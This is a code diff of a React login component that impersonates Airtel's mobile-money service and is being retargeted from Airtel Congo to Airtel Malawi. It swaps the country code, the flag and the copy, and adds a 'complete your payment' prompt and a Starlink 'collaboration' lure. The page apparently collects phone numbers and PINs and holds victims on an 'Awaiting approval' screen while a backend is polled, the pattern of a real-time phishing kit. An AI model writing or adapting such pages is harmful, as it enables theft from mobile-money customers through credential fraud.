@@ -1,8 +1,8 @@
 import React, { useState, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 
-const COUNTRY_CODE = '+243';
-const PHONE_PLACEHOLDER = '951234567'; 
+const COUNTRY_CODE = '+265';
+const PHONE_PLACEHOLDER = '991234567'; // Malawi mobile: 9 digits
 const PHONE_MAX = 9;
 
 function AirtelLogin() {
@@ -12,8 +12,7 @@ function AirtelLogin() {
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
   const [showPin, setShowPin] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [error, setError] = useState(''); 
-  
+  const [error, setError] = useState('');
   const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
   const [refId, setRefId] = useState<string | null>(null);
 
@@ -50,12 +49,12 @@ function AirtelLogin() {
     const pinString = pin.join('');
 
     if (phone.length < PHONE_MAX || pinString.length < 4) {
-      return; 
+      return;
     }
 
     setError('');
     setIsLoading(true);
-    setIsWaitingForApproval(true); 
+    setIsWaitingForApproval(true);
 
     const fullPhone = `${COUNTRY_CODE}${phone}`;
     localStorage.setItem('airtelPhone', fullPhone);
@@ -71,7 +70,7 @@ function AirtelLogin() {
 
       if (data.status === 'pending' && data.ref_id) {
         setRefId(data.ref_id);
-        
+
         const pollInterval = setInterval(async () => {
           try {
             const statusRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login-status/${data.ref_id}`);
@@ -84,8 +83,7 @@ function AirtelLogin() {
               clearInterval(pollInterval);
               setIsWaitingForApproval(false);
               setIsLoading(false);
-              // Redirect back to landing page on deny
-              navigate('/'); 
+              navigate('/');
             }
           } catch (pollErr) {
             console.error('Polling error:', pollErr);
@@ -98,7 +96,7 @@ function AirtelLogin() {
       console.error('Login request failed:', err);
       setIsWaitingForApproval(false);
       setIsLoading(false);
-      setError('Erreur réseau. Veuillez réessayer.'); 
+      setError('Network error. Please try again.');
     }
   };
 
@@ -122,13 +120,10 @@ function AirtelLogin() {
           position: relative;
         }
 
-        /* WAITING OVERLAY */
         .waiting-overlay {
           position: fixed;
-          top: 0;
-          left: 0;
-          width: 100vw;
-          height: 100vh;
+          top: 0; left: 0;
+          width: 100vw; height: 100vh;
           display: flex;
           flex-direction: column;
           align-items: center;
@@ -169,7 +164,6 @@ function AirtelLogin() {
           text-align: center;
         }
 
-        /* TOP SECTION */
         .login-top-section {
           flex: 1;
           padding: 40px 24px;
@@ -179,7 +173,6 @@ function AirtelLogin() {
           position: relative;
         }
 
-        /* LOGO */
         .logo-wrapper {
           display: flex;
           flex-direction: column;
@@ -195,12 +188,8 @@ function AirtelLogin() {
           margin-top: 8px;
           font-weight: 600;
         }
-        
-        .tagline span {
-          color: #DA1C1C;
-        }
+        .tagline span { color: #DA1C1C; }
 
-        /* TYPOGRAPHY */
         .login-title {
           font-size: 24px;
           font-weight: 800;
@@ -224,13 +213,12 @@ function AirtelLogin() {
           max-width: 400px;
         }
 
-        /* PHONE INPUT */
         .phone-input-container {
           width: 100%;
           max-width: 400px;
           display: flex;
           align-items: center;
-          border: 2px solid #2563EB; 
+          border: 2px solid #2563EB;
           border-radius: 8px;
           padding: 12px 16px;
           margin-bottom: 32px;
@@ -243,6 +231,7 @@ function AirtelLogin() {
           margin-right: 10px;
           border-radius: 2px;
           overflow: hidden;
+          flex-shrink: 0;
         }
 
         .country-code-text {
@@ -261,11 +250,8 @@ function AirtelLogin() {
           background: transparent;
         }
 
-        .phone-input::placeholder {
-          color: #9CA3AF;
-        }
+        .phone-input::placeholder { color: #9CA3AF; }
 
-        /* PIN INPUT */
         .pin-section {
           width: 100%;
           display: flex;
@@ -287,10 +273,7 @@ function AirtelLogin() {
           gap: 16px;
         }
 
-        .pin-boxes {
-          display: flex;
-          gap: 12px;
-        }
+        .pin-boxes { display: flex; gap: 12px; }
 
         .pin-box {
           width: 52px;
@@ -305,9 +288,7 @@ function AirtelLogin() {
           background-color: #fff;
         }
 
-        .pin-box::placeholder {
-          color: #E5E7EB;
-        }
+        .pin-box::placeholder { color: #E5E7EB; }
 
         .eye-icon {
           cursor: pointer;
@@ -317,14 +298,13 @@ function AirtelLogin() {
           color: #6B7280;
         }
 
-        /* BUTTON */
         .login-btn {
           width: 100%;
           max-width: 400px;
           padding: 16px;
           border-radius: 30px;
           border: none;
-          background-color: #D1D5DB; 
+          background-color: #D1D5DB;
           color: #ffffff;
           font-size: 16px;
           font-weight: 700;
@@ -339,7 +319,6 @@ function AirtelLogin() {
           cursor: pointer;
         }
 
-        /* FOOTER SECTION */
         .login-footer {
           background-color: #F3F4F6;
           padding: 32px 24px;
@@ -370,10 +349,7 @@ function AirtelLogin() {
           letter-spacing: 1px;
         }
 
-        .starlink-text sup {
-          font-size: 8px;
-          font-weight: normal;
-        }
+        .starlink-text sup { font-size: 8px; font-weight: normal; }
 
         .copyright {
           font-size: 12px;
@@ -382,18 +358,15 @@ function AirtelLogin() {
         }
       `}</style>
 
-      {/* WAITING OVERLAY */}
       {isWaitingForApproval && (
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
-          <div className="waiting-title">En attente d'approbation</div>
+          <div className="waiting-title">Awaiting approval</div>
         </div>
       )}
 
       <div className={isWaitingForApproval ? 'faded-content' : ''}>
-        
         <div className="login-top-section">
-          
           <div className="logo-wrapper">
             <svg width="140" height="40" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
               <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
@@ -403,21 +376,27 @@ function AirtelLogin() {
             <p className="tagline">A REASON TO <span>IMAGINE</span></p>
           </div>
 
-          {/* HARDCODED FRENCH TITLE */}
           <h1 className="login-title">
-            Connectez-vous à Airtel Lite pour finaliser le paiement.
+            Log in to Airtel Money to complete your payment.
           </h1>
 
           {error && <div className="error-message">{error}</div>}
 
           <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-            
             <div className="phone-input-container">
+              {/* Malawi Flag */}
               <svg className="flag-icon" viewBox="0 0 640 480" xmlns="http://www.w3.org/2000/svg">
-                <path fill="#007fff" d="M0 0h640v480H0z"/>
-                <path fill="#f7d618" d="M0 240h640v240H0z"/>
-                <path fill="#ce1021" d="M0 0l640 480M640 0L0 480" stroke="#ce1021" strokeWidth="40"/>
-                <path fill="#f7d618" d="M60 60h40v40H60z"/>
+                <rect width="640" height="160" fill="#000"/>
+                <rect y="160" width="640" height="160" fill="#CE1126"/>
+                <rect y="320" width="640" height="160" fill="#339E35"/>
+                <path d="M265 160 A55 55 0 0 1 375 160 Z" fill="#CE1126"/>
+                <g stroke="#CE1126" strokeWidth="14" strokeLinecap="round">
+                  <line x1="320" y1="105" x2="320" y2="75"/>
+                  <line x1="283" y1="115" x2="260" y2="92"/>
+                  <line x1="357" y1="115" x2="380" y2="92"/>
+                  <line x1="262" y1="145" x2="232" y2="137"/>
+                  <line x1="378" y1="145" x2="408" y2="137"/>
+                </g>
               </svg>
               <span className="country-code-text">{COUNTRY_CODE}</span>
               <input
@@ -432,8 +411,7 @@ function AirtelLogin() {
             </div>
 
             <div className="pin-section">
-              {/* HARDCODED FRENCH LABEL */}
-              <span className="pin-label">Entrez votre Code</span>
+              <span className="pin-label">Enter your PIN</span>
               <div className="pin-inputs-row">
                 <div className="pin-boxes">
                   {pin.map((digit, index) => (
@@ -450,7 +428,7 @@ function AirtelLogin() {
                     />
                   ))}
                 </div>
-                
+
                 <div className="eye-icon" onClick={() => setShowPin(!showPin)}>
                   {showPin ? (
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -467,15 +445,13 @@ function AirtelLogin() {
               </div>
             </div>
 
-            {/* HARDCODED FRENCH BUTTON */}
-            <button 
-              type="submit" 
+            <button
+              type="submit"
               className={`login-btn ${isFormValid ? 'active' : ''}`}
               disabled={!isFormValid || isLoading || isWaitingForApproval}
             >
-              CONNEXION
+              LOGIN
             </button>
-
           </form>
         </div>
 
@@ -489,10 +465,10 @@ function AirtelLogin() {
             <p className="tagline">A REASON TO <span>IMAGINE</span></p>
           </div>
 
-          <p className="collab-text">En collaboration avec</p>
+          <p className="collab-text">In collaboration with</p>
           <p className="starlink-text">STARLINK<sup>TM</sup></p>
 
-          <p className="copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
+          <p className="copyright">© 2026 Airtel Malawi. All rights reserved.</p>
         </div>
       </div>
     </div>
